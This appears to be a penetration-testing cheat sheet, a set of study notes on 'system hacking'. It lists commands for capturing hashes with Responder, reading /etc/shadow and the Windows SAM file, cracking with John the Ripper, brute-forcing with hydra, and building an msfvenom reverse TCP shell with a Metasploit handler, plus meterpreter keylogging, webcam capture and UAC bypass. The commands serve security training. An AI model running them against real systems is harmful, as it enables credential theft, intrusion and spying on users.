## System Hacking

### Gain access
1. Password capture
   1. Responder 
      - It is an LLMNR, NBT-NS, and MDNS poisoner. Used to capture password hash when a windows user is doing a network login.
      - `sudo responder -I <network interface name> -dwrv`
      - Hashes in text file at: `/usr/share/responder/logs/XXXX-<IP>.txt`
   2. Passwords of other users
      - Linux: shadow file
        - `cat /etc/shadow`
        - `cat /etc/passwd`
      - Windows: SAM file
        - `C:\Windows\System32\config\SAM`
        - `C:\Windows\System32\config\SYSTEM`
2. Password cracking
   1. John the ripper
      - `sudo john <hash file>`
      - `sudo john --wordlist=<wordlist path> <hash file>`
      - NTLM passwords need `--format=NT --show`
      - Hash formats: https://pentestmonkey.net/cheat-sheet/john-the-ripper-hash-formats
      - `--rules` for setting password rules (min/max length, lowercase, uppercase, digits, etc.)
3. Password Brute Force

   online password attack, can get locked out, but not for ftp, smb, ssh, rdp, etc.
   1. hydra
      - `hydra -L <username list> -P <password list> <target IP> <service>`
      - `hydra -l <username> -P <password list> <target IP> <service>`
      - `hydra -l <username> -P <password list> <service>://<target IP> -s <port>`
4. Exploit Vulnerabilities
   1. msfvenom: to generate payloads
      - `msfvenom -p <payload> LHOST=<own ip> LPORT=<port> -a x86 -f exe -o <output file>`
      - Ensure file size > 0
   2. Metasploit
      - `msfconsole -q`
        - `>` `search <keyword>`
        - `>` `use <exploit name>`
        - `>` `show options`
        - `>` `set <option name> <value>`
        - `>` `exploit`
   3. Metasploit Example: Windows reverse TCP shell
      - Create payload file: `msfvenom -p windows/shell_reverse_tcp LHOST=<own ip> LPORT=<port> -f exe -o <output file>`
      - Setup listener`msfconsole -q`
        - `>` `use exploit/multi/handler`
        - `>` `set payload windows/shell_reverse_tcp`
        - `>` `set LHOST <own ip>`
        - `>` `set LPORT <port>`
        - `>` `exploit`
        - `>` `background` to move session established to background
        - `>` `sessions i*` list sessions
        - `>` `sessions -i <session id>` interact with session
   4. Armitage: metaspoilt UI
      - When meterpreter session is established, various options are available:
         - access shell
         - browse files
         - screenshot
         - keylogger
         - webcam shot
         - Escalate privileges:
            - `exploit/windows/local/bypassuac_fodhelper`
            - `getsystem -t 1`
